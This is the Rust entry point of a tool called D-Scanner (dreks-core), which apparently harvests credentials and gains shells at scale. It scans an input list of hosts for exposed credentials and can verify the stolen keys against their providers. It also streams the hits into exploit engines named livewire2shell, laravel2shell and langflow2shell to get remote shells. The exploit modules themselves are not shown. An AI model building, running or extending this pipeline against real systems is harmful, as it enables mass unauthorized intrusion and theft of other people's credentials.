// src/main.rs
// D-Scanner Rust Engine — entry point.
//
// M1 scope: pipeline foundation + DNS + HTTP fetch + credential scanning.
// M2 scope: exploit engines (livewire2shell, laravel2shell, langflow2shell, etc.)
//
// Use --mode scan    (default) for M1 only.
// Use --mode exploit for M2 only (reads --hits-input).
// Use --mode full    for M1 + M2 streaming (concurrent, zero disk I/O between stages).

mod config;
mod credential;
mod dns;
mod exploit;
mod fetch;
mod pipeline;
mod types;

use clap::Parser;
use std::sync::Arc;
use std::sync::atomic::Ordering;
use tracing::info;
use tracing_subscriber::EnvFilter;

use config::{Cli, Config};
use types::ScanStats;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();

    // Setup structured logging
    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| EnvFilter::new(&cli.log_level)),
        )
        .with_target(false)
        .compact()
        .init();

    let config = Arc::new(Config::from_cli(&cli));
    let stats = Arc::new(ScanStats::default());

    info!(
        concurrency = config.concurrency,
        dns_servers = config.dns_servers.len(),
        input = %cli.input,
        "dreks-core starting"
    );

    // Progress reporter (every 10s)
    let stats_prog = stats.clone();
    let _progress_task = tokio::spawn(async move {
        loop {
            tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
            let done = stats_prog.done.load(Ordering::Relaxed);
            let total = stats_prog.total.load(Ordering::Relaxed);
            let hits = stats_prog.hits.load(Ordering::Relaxed);
            let dns_nx = stats_prog.dns_nxdomain.load(Ordering::Relaxed);
            let conn_to = stats_prog.connect_timeout.load(Ordering::Relaxed);
            info!(
                "[progress] {done}/{total} done · hits={hits} · nxdomain={dns_nx} · conn_timeout={conn_to}"
            );
        }
    });

    match config.mode.as_str() {

        // ── M1 only: credential scan ──────────────────────────────────────────
        "scan" => {
            let (hit_tx, hit_rx) = spawn_hit_writer(config.output_path.clone());
            pipeline::run(config.clone(), stats.clone(), hit_tx).await?;
            drop(hit_rx); // writer finishes when hit_tx is dropped by pipeline

            let total = stats.total.load(Ordering::Relaxed);
            let hits  = stats.hits.load(Ordering::Relaxed);
            let dns_ok = stats.dns_ok.load(Ordering::Relaxed);
            let dns_nx = stats.dns_nxdomain.load(Ordering::Relaxed);
            info!(total, hits, dns_ok, dns_nxdomain = dns_nx, "[done] scan complete");
        }

        // ── M2 only: exploit from file ────────────────────────────────────────
        "exploit" => {
            let hits_path = config.hits_input.clone()
                .or_else(|| config.output_path.as_ref().map(|p| p.to_string_lossy().to_string()));

            match hits_path {
                None => {
                    tracing::error!("--mode exploit requires --hits-input <file.jsonl>");
                }
                Some(hits_file) => {
                    info!("[exploit] loading engines (file mode)");
                    let engines = exploit::all_engines_with_config(config.exploit_timeout, config.path_scan);
                    info!("[exploit] {} engines registered (path_scan={})", engines.len(), config.path_scan);

                    let dispatch_cfg = exploit::dispatcher::DispatchConfig {
                        hits_input: hits_file,
                        exploit_output: config.exploit_output.clone(),
                        concurrency: config.exploit_concurrency,
                        timeout_secs: config.exploit_timeout,
                        skip_dead_check: config.skip_dead_check,
                    };

                    if let Err(e) = exploit::dispatcher::run(dispatch_cfg, engines).await {
                        tracing::error!("[exploit] dispatcher error: {e}");
                    }
                }
            }
        }

        // ── FULL streaming mode: M1 + M2 concurrent ───────────────────────────
        // Phase 3B: M1 hits stream directly to M2 via tokio channel.
        // M1 and M2 run CONCURRENTLY — no file I/O between stages.
        // Fresh M1 hits go to M2 immediately → ~0% dead targets → higher utilization.
        "full" => {
            info!("[full] streaming mode — M1 + M2 concurrent, no JSONL handoff");

            // Channel: M1 hits → M2 dispatcher
            let (m2_hit_tx, m2_hit_rx) = tokio::sync::mpsc::channel::<types::Hit>(10_000);

            // M2 dispatcher — starts immediately, waits for M1 hits
            let dispatch_cfg = exploit::dispatcher::DispatchConfig {
                hits_input: String::new(), // unused in streaming mode
                exploit_output: config.exploit_output.clone(),
                concurrency: config.exploit_concurrency,
                timeout_secs: config.exploit_timeout,
                skip_dead_check: config.skip_dead_check,
            };
            let engines = exploit::all_engines_with_config(config.exploit_timeout, config.path_scan);
            info!("[full] {} engines registered (timeout={}s, path_scan={})", engines.len(), config.exploit_timeout, config.path_scan);

            let m2_task = tokio::spawn(
                exploit::dispatcher::run_from_channel(m2_hit_rx, dispatch_cfg, engines)
            );

            // Tee task: receives M1 hits, forwards to M2 + optionally writes M1 hits file
            let output_path = config.output_path.clone();
            let verify_creds = config.verify_creds;
            let (hit_tx, mut m1_rx) = tokio::sync::mpsc::channel::<types::Hit>(10_000);

            let tee_task = tokio::spawn(async move {
                use tokio::io::AsyncWriteExt;
                let mut file_writer: Option<tokio::io::BufWriter<tokio::fs::File>> = None;
                if let Some(ref path) = output_path {
                    match tokio::fs::File::create(path).await {
                        Ok(f) => file_writer = Some(tokio::io::BufWriter::new(f)),
                        Err(e) => tracing::error!("cannot open output file: {e}"),
                    }
                }

                // Verification tasks run in background
                let mut verify_tasks = tokio::task::JoinSet::new();

                while let Some(hit) = m1_rx.recv().await {
                    // Forward to M2 (non-blocking: if M2 buffer full, drop rather than backpressure M1)
                    let _ = m2_hit_tx.send(hit.clone()).await;

                    // Optionally verify credentials (runs in parallel, doesn't block)
                    if verify_creds && !hit.provider.is_empty() && !hit.value.is_empty() {
                        let provider = hit.provider.clone();
                        let value = hit.value.clone();
                        verify_tasks.spawn(async move {
                            if let Some(result) = exploit::verify_credential(&provider, &value).await {
                                if result.valid {
                                    tracing::info!(
                                        "[cred_verify] VALID {} credential: {}...{}",
                                        result.provider,
                                        &result.value[..8.min(result.value.len())],
                                        result.details.unwrap_or_default()
                                    );
                                }
                            }
                        });
                    }

                    // Optionally write M1 hits to file
                    if let Some(ref mut fw) = file_writer {
                        let mut line = serde_json::to_string(&hit).unwrap_or_default();
                        line.push('\n');
                        let _ = fw.write_all(line.as_bytes()).await;
                    }
                }

                // Wait for verification tasks to complete
                while verify_tasks.join_next().await.is_some() {}

                // m2_hit_tx dropped here → M2 knows M1 is done
                if let Some(ref mut fw) = file_writer {
                    let _ = fw.flush().await;
                }
            });

            // M1 pipeline — sends hits to tee_task
            pipeline::run(config.clone(), stats.clone(), hit_tx).await?;

            // Wait for tee + M2 to drain
            tee_task.await?;
            if let Err(e) = m2_task.await? {
                tracing::error!("[full] M2 error: {e}");
            }

            let total = stats.total.load(Ordering::Relaxed);
            let hits  = stats.hits.load(Ordering::Relaxed);
            info!(total, m1_hits = hits, "[done] full streaming pipeline complete");
        }

        _ => {
            tracing::error!("unknown mode '{}'. Use: scan | exploit | full", config.mode);
        }
    }

    Ok(())
}

// ── Helper: spawn a hit writer task, return (Sender, JoinHandle) ─────────────
fn spawn_hit_writer(
    output_path: Option<std::path::PathBuf>,
) -> (tokio::sync::mpsc::Sender<types::Hit>, tokio::task::JoinHandle<()>) {
    let (hit_tx, mut hit_rx) = tokio::sync::mpsc::channel::<types::Hit>(10_000);
    let handle = tokio::spawn(async move {
        use tokio::io::AsyncWriteExt;
        let mut file_writer: Option<tokio::io::BufWriter<tokio::fs::File>> = None;
        if let Some(ref path) = output_path {
            match tokio::fs::File::create(path).await {
                Ok(f) => file_writer = Some(tokio::io::BufWriter::new(f)),
                Err(e) => tracing::error!("cannot open output file {:?}: {e}", path),
            }
        }
        while let Some(hit) = hit_rx.recv().await {
            let mut line = serde_json::to_string(&hit).unwrap_or_default();
            line.push('\n');
            if let Some(ref mut fw) = file_writer {
                let _ = fw.write_all(line.as_bytes()).await;
            } else {
                print!("{}", line);
            }
        }
        if let Some(ref mut fw) = file_writer {
            let _ = fw.flush().await;
        }
    });
    (hit_tx, handle)
}
